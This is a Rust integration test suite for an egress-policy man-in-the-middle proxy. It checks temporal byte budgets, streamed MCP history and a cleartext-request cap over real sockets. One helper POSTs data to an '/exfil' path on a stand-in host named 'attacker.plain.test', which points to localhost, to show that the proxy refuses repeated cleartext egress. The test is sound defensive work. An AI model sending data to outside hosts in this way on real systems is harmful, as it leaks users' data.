//! The temporal byte budget enforced through the **real** MITM egress proxy.
//!
//! `temporal_egress_budget.rs` proves the rule at the facade, calling `decide`/`record`
//! directly. This drives actual TLS traffic through `MitmInterceptor` and asserts a
//! later request is refused with 403 *because* the deliveries of the earlier ones
//! exhausted the budget — the whole loop, over sockets:
//!
//! ```text
//! workload --TLS--> proxy --> EgressPolicyInterceptor::intercept --> PolicyEngine::decide
//!                     |                                                   ^
//!                     '--> write upstream --> record_outcome --> PolicyEngine::record
//! ```
//!
//! The interceptor under test is the shipped `EgressPolicyInterceptor`, not a test
//! double, so what passes here is the real integration.

#![cfg(feature = "egress-adapter")]

#[path = "../../egress-gateway/tests/harness/mod.rs"]
mod harness;

mod support;

use std::path::PathBuf;
use std::sync::Arc;

use egress_gateway::{
    AuditDecision, CapabilitySet, EffectAttempt, MitmConfig, MitmHandle, MitmInterceptor,
    StubEmitter,
};
use policy::{
    EgressPolicyInterceptor, GovernedBox, Policy, PolicyEngine, Principal, generate_mcp_schema,
};

use harness::{TlsUpstream, WorkloadClient};

/// The budget rule, calibrated for wire bytes (headers included).
const BUDGET_POLICY: &str = include_str!("policies/egress_byte_budget_e2e.dw");

/// A permit for the transport legs the budget rule does not govern.
///
/// The shipped schema has no `permit` for `net:connect`, so a
/// budget-only policy would deny the connect and the test would never reach an HTTP
/// request. These two rules exist to isolate the temporal decision to `http:request`.
const TRANSPORT_POLICY: &str = r#"
permit(principal == Box::Agent::"self", action == Box::Action::"net:connect", resource);
"#;

fn proxy_port(handle: &MitmHandle) -> u16 {
    handle.port().expect("a TCP-mode proxy always has a port")
}

fn budget_policy() -> Arc<PolicyEngine> {
    Arc::new(
        support::open_policy(vec![
            Policy {
                origin: PathBuf::from("egress_byte_budget_e2e.dw"),
                text: BUDGET_POLICY.to_string(),
            },
            Policy {
                origin: PathBuf::from("transport.dw"),
                text: TRANSPORT_POLICY.to_string(),
            },
        ])
        .expect("temporal policy loads"),
    )
}

#[test]
fn the_byte_budget_denies_a_later_request_through_the_real_proxy() {
    let host = "api.budget.test";
    let upstream = TlsUpstream::start(host);
    let port = upstream.port();

    let policy = budget_policy();
    let interceptor = EgressPolicyInterceptor::into_handle(
        Arc::clone(&policy),
        Principal::agent(),
        GovernedBox::assigned("test-box"),
    );

    let config = MitmConfig {
        upstream_ca_pems: vec![upstream.ca_pem()],
        dns_overrides: vec![(host.to_string(), "127.0.0.1".parse().unwrap())],
        ..MitmConfig::default()
    };
    let records = StubEmitter::new();
    let handle = MitmInterceptor::start_with(
        config,
        CapabilitySet::default(),
        interceptor,
        Box::new(records.clone()),
        None,
    )
    .expect("proxy starts");

    // One connection carries one request: the proxy answers `Connection: close` and
    // handles a single request/response pair per tunnel. So each iteration is a fresh
    // client, and each fires its own connect + request + response effects.
    // 24 iterations, not 6. An earlier version of this test stopped at 6 and asserted
    // the denial was "stable once tripped" — which passed only because the run was too
    // short to observe otherwise. The budget is a 60-second window, so a long run must
    // stay denied for the whole window rather than sawtooth back to 200.
    let mut statuses = Vec::new();
    for _ in 0..24 {
        let mut client = WorkloadClient::connect(proxy_port(&handle), host, port);
        client.send_request("POST", "/v1/upload", &[], b"0123456789");
        statuses.push(client.read_status());
    }

    // The first request meets an empty budget and is allowed.
    assert_eq!(
        statuses[0], 200,
        "the first request is under the empty budget: {statuses:?}"
    );

    // Some later request is refused. This is the assertion the integration exists for:
    // an identical request, allowed earlier, is now denied purely because of what the
    // earlier ones delivered.
    let denied_at = statuses
        .iter()
        .position(|status| *status == 403)
        .unwrap_or_else(|| panic!("the budget must eventually deny: {statuses:?}"));

    // Once tripped the denial holds for the rest of the run, because the run is far
    // shorter than the 60-second window and denied requests deliver nothing.
    //
    // This is the assertion that caught the real defect: while the event clock was a
    // counter, `within 60s` meant "the last 60 events", so denied attempts aged the
    // budget out and a 200 reappeared 13 iterations after the first 403. A sawtooth here
    // means the window is measuring traffic instead of time.
    assert!(
        statuses[denied_at..].iter().all(|status| *status == 403),
        "a budget denial must hold for the whole window; a 200 reappearing means the \
         window is counting events, not seconds: {statuses:?}"
    );

    // The upstream saw exactly the allowed requests. This is what makes the denial
    // real rather than cosmetic — a denied request never reached the network.
    assert_eq!(
        upstream.request_count(),
        denied_at,
        "a denied request must never reach the upstream: {statuses:?}"
    );

    // The denial is recorded.
    assert!(
        records
            .records()
            .iter()
            .any(|record| record.decision == AuditDecision::Deny),
        "the request-leg denial must be recorded"
    );
}

#[test]
fn a_stateless_policy_allows_every_request_through_the_same_proxy() {
    // The control. Same proxy, same traffic, same principal — but a policy with no
    // temporal clause. Every request is allowed, which proves the denials in the test
    // above come from accumulated history and not from some unrelated property of the
    // harness (a header limit, a connection cap, a flaky upstream).
    let host = "api.stateless.test";
    let upstream = TlsUpstream::start(host);
    let port = upstream.port();

    let policy = Arc::new(
        support::open_policy(vec![Policy {
            origin: PathBuf::from("stateless.dw"),
            text: format!(
                "{TRANSPORT_POLICY}\npermit(principal == Box::Agent::\"self\", action == Box::Action::\"http:request\", resource);"
            ),
        }])
        .expect("stateless policy loads"),
    );
    let interceptor = EgressPolicyInterceptor::into_handle(
        Arc::clone(&policy),
        Principal::agent(),
        GovernedBox::assigned("test-box"),
    );

    let config = MitmConfig {
        upstream_ca_pems: vec![upstream.ca_pem()],
        dns_overrides: vec![(host.to_string(), "127.0.0.1".parse().unwrap())],
        ..MitmConfig::default()
    };
    let handle = MitmInterceptor::start(config, CapabilitySet::default(), interceptor)
        .expect("proxy starts");

    for index in 0..6 {
        let mut client = WorkloadClient::connect(proxy_port(&handle), host, port);
        client.send_request("POST", "/v1/upload", &[], b"0123456789");
        assert_eq!(
            client.read_status(),
            200,
            "request {index} must be allowed without a temporal budget"
        );
    }
    assert_eq!(upstream.request_count(), 6);
}

#[test]
fn streamed_http_and_mcp_history_waits_for_upstream_termination() {
    use std::io::Read;
    use std::time::{Duration, Instant};

    for (end, disconnect) in [
        ("complete", false),
        ("truncated", false),
        ("complete", true),
        ("truncated", true),
        ("deadline", true),
    ] {
        let host = "mcp-history.test";
        let (upstream, sender) = TlsUpstream::start_controlled(host);
        let schema = generate_mcp_schema(
            "demo",
            r#"{"result":{"tools":[{"name":"act","inputSchema":{"type":"object"}}]}}"#,
        )
        .unwrap();
        let policy = support::open_policy_with_mcp_schemas(
            vec![Policy {
                origin: PathBuf::from("stream-history.dw"),
                text: format!(
                    r#"{TRANSPORT_POLICY}
                    permit(principal, action == Box::Action::"mcp:call", resource);
                    permit(principal, action == Box::Action::"http:request", resource)
                    when {{ context.input.path == "/mcp" }};
                    permit(principal, action == Box::Action::"http:request", resource)
                    when {{ context.input.path == "/after-http" }}
                    when temporal {{
                        formerly within 300s (
                            Box::Action::"http:request"::response{{ input.path: "/mcp", output.status: 200 }}
                        )
                    }};
                    permit(principal, action == Box::Action::"http:request", resource)
                    when {{ context.input.path == "/after-mcp" }}
                    when temporal {{
                        formerly within 300s (
                            Box::Action::"mcp:call"::response{{ input.server: "demo", input.tool: "act" }}
                        )
                    }};"#
                ),
            }],
            &[schema],
        )
        .unwrap();
        let interceptor = EgressPolicyInterceptor::into_handle(
            Arc::new(policy),
            Principal::agent(),
            GovernedBox::assigned("test-box"),
        );
        let handle = MitmInterceptor::start(
            MitmConfig {
                upstream_ca_pems: vec![upstream.ca_pem()],
                dns_overrides: vec![(host.to_string(), "127.0.0.1".parse().unwrap())],
                mcp_servers: vec![(host.to_string(), "demo".to_string())],
                upstream_read_deadline: Duration::from_secs(2),
                ..MitmConfig::default()
            },
            CapabilitySet::default(),
            interceptor.clone(),
        )
        .unwrap();
        let probe = |path| {
            interceptor.intercept(&EffectAttempt::HttpRequest {
                host,
                port: upstream.port(),
                method: "GET",
                path,
                body_bytes: 0,
                intercepted: true,
                mcp: None,
            })
        };
        let mut client = WorkloadClient::connect(proxy_port(&handle), host, upstream.port());
        client.set_read_timeout(Duration::from_secs(3));
        client.send_request(
            "POST",
            "/mcp",
            &[("Content-Type", "application/json")],
            br#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"act","arguments":{}}}"#,
        );
        sender
            .send(
                b"HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nTransfer-Encoding: chunked\r\n\r\n6\r\ndata:\n\r\n"
                    .to_vec(),
            )
            .unwrap();
        let head = client.read_head();
        assert!(head.starts_with("HTTP/1.1 200"), "{head}");
        let mut prefix = [0; 6];
        client.response_body(&head).read_exact(&mut prefix).unwrap();
        assert_eq!(&prefix, b"data:\n");
        let mut client = if disconnect {
            client.abort();
            for _ in 0..2 {
                let _ = sender.send(b"6\r\ndata:\n\r\n".to_vec());
                std::thread::sleep(Duration::from_millis(50));
            }
            None
        } else {
            Some(client)
        };
        for path in ["/after-http", "/after-mcp"] {
            assert!(
                probe(path).is_err(),
                "{end}, disconnect={disconnect}: {path} became available during the response"
            );
        }
        if end == "complete" {
            sender.send(b"0\r\n\r\n".to_vec()).unwrap();
        }
        let held_sender = (end == "deadline").then_some(sender);
        if let Some(client) = &mut client {
            assert_eq!(
                client
                    .response_body(&head)
                    .read_to_end(&mut Vec::new())
                    .is_ok(),
                end == "complete"
            );
        }
        for path in ["/after-http", "/after-mcp"] {
            let deadline = Instant::now() + Duration::from_secs(3);
            loop {
                match probe(path) {
                    Ok(permit) => {
                        permit.mark_indeterminate();
                        break;
                    }
                    Err(error) => {
                        assert!(
                            Instant::now() < deadline,
                            "{end}, disconnect={disconnect}: {path} missing after termination: {error}"
                        );
                        std::thread::sleep(Duration::from_millis(10));
                    }
                }
            }
        }
        drop(held_sender);
    }
}

/// A cap of one cleartext exchange per hour, keyed on the recorded transport of each response.
const CLEARTEXT_CAP_POLICY: &str = r#"
permit(principal, action == Box::Action::"http:request", resource);
@id("cleartext_cap")
forbid(principal, action == Box::Action::"http:request", resource)
when { context.input.intercepted == false }
when temporal {
    formerly within 3600s (
        Box::Action::"http:request"::response{ input.intercepted: false }
    )
};
"#;

/// A plaintext origin that counts the requests it reads and answers `200`.
struct PlainOrigin {
    port: u16,
    seen: Arc<std::sync::atomic::AtomicUsize>,
}

impl PlainOrigin {
    fn start() -> Self {
        use std::io::{BufRead, BufReader, Read, Write};
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let seen = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let count = Arc::clone(&seen);
        std::thread::spawn(move || {
            for stream in listener.incoming().flatten() {
                let mut reader = BufReader::new(stream);
                let mut length = 0;
                let mut head = false;
                loop {
                    let mut line = String::new();
                    if reader.read_line(&mut line).unwrap_or(0) == 0 || line == "\r\n" {
                        break;
                    }
                    head = true;
                    if let Some((name, value)) = line.split_once(':')
                        && name.eq_ignore_ascii_case("content-length")
                    {
                        length = value.trim().parse().unwrap_or(0);
                    }
                }
                if !head {
                    continue;
                }
                let _ = reader.by_ref().take(length).read_to_end(&mut Vec::new());
                count.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                let _ = reader.get_mut().write_all(
                    b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok",
                );
            }
        });
        Self { port, seen }
    }

    fn request_count(&self) -> usize {
        self.seen.load(std::sync::atomic::Ordering::SeqCst)
    }
}

/// Send one absolute-form plain-HTTP POST through the proxy and return the reply status.
fn plain_post(proxy: u16, host: &str, port: u16) -> u16 {
    use std::io::{Read, Write};
    let mut tcp = std::net::TcpStream::connect(("127.0.0.1", proxy)).unwrap();
    tcp.set_read_timeout(Some(std::time::Duration::from_secs(10)))
        .unwrap();
    tcp.write_all(
        format!(
            "POST http://{host}:{port}/exfil HTTP/1.1\r\nHost: {host}:{port}\r\n\
             Content-Length: 10\r\nConnection: close\r\n\r\n0123456789"
        )
        .as_bytes(),
    )
    .unwrap();
    let mut reply = Vec::new();
    let _ = tcp.read_to_end(&mut reply);
    let reply = String::from_utf8_lossy(&reply);
    reply
        .split_whitespace()
        .nth(1)
        .and_then(|status| status.parse().ok())
        .unwrap_or_else(|| panic!("no status in the reply: {reply:?}"))
}

#[test]
fn a_cleartext_cap_counts_plain_http_responses_through_the_real_proxy() {
    let tls_host = "api.tls.test";
    let plain_host = "attacker.plain.test";
    let upstream = TlsUpstream::start(tls_host);
    let origin = PlainOrigin::start();

    let policy = Arc::new(
        support::open_policy(vec![Policy {
            origin: PathBuf::from("cleartext_cap.dw"),
            text: format!("{TRANSPORT_POLICY}\n{CLEARTEXT_CAP_POLICY}"),
        }])
        .expect("cleartext cap policy loads"),
    );
    let interceptor = EgressPolicyInterceptor::into_handle(
        Arc::clone(&policy),
        Principal::agent(),
        GovernedBox::assigned("test-box"),
    );
    let config = MitmConfig {
        upstream_ca_pems: vec![upstream.ca_pem()],
        dns_overrides: vec![
            (tls_host.to_string(), "127.0.0.1".parse().unwrap()),
            (plain_host.to_string(), "127.0.0.1".parse().unwrap()),
        ],
        ..MitmConfig::default()
    };
    let handle = MitmInterceptor::start(config, CapabilitySet::default(), interceptor)
        .expect("proxy starts");
    let tls_request = || {
        let mut client = WorkloadClient::connect(proxy_port(&handle), tls_host, upstream.port());
        client.send_request("POST", "/v1/upload", &[], b"0123456789");
        client.read_status()
    };

    // A TLS exchange is recorded as intercepted, so it does not arm the cleartext cap.
    assert_eq!(tls_request(), 200, "a TLS exchange is under the cap");

    // The first plain exchange is allowed and recorded as cleartext; every later one is refused.
    // If the response leg recorded a plain exchange as intercepted, the cap would never match
    // and all four requests would be allowed.
    let statuses: Vec<u16> = (0..4)
        .map(|_| plain_post(proxy_port(&handle), plain_host, origin.port))
        .collect();
    assert_eq!(
        statuses,
        [200, 403, 403, 403],
        "only one cleartext exchange fits under the cap"
    );
    assert_eq!(
        origin.request_count(),
        1,
        "a refused cleartext request never reaches the origin"
    );

    // The cap governs cleartext only: a later TLS exchange is still allowed.
    assert_eq!(tls_request(), 200, "the cleartext cap does not refuse TLS");
    assert_eq!(upstream.request_count(), 2);
}
